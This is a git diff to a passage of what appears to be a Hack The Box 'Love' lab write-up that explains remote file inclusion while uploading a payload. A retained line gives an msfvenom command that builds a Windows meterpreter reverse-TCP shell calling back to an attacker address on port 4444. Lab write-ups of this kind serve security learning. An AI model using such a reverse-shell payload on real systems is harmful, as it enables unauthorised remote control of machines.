@@ -166,7 +166,8 @@ Let's try to upload a file. I'll start a web server on Kali and try to download 
 ![upload]({{https://jsom1.github.io/}}/_images/htb_love_upload.png)
 </div>
 
-I'm not sure about what it does exactly... Does it execute it? If it does, we could easily get a reverse shell... Being able to upload remote files on a server is called a **RFI** (remote file inclusion) vulnerability. Let's upload someething simpler to understand how it works. Atfter many tries, I used *msfvenom* to create a reverse shell with the following syntax:
+I'm not sure about what it does exactly... Does it execute it? If it does, we could easily get a reverse shell... Being able to upload remote files into an application's running code is known as a **RFI** (remote file inclusion) vulnerability. This kind of vulnerability is commonly found in PHP applications. In order to exploit such a vulnerability, we must be able to not only execute code, but also to write our shell payload somewhere. Usually we can't simpy upload a file like here, but I won't explain how it works in other situations here. \\
+Instead, let's upload something simpler to understand how it works. Atfter many tries, I used *msfvenom* to create a reverse shell with the following syntax:
 
 ````
 sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f exe > test.exe
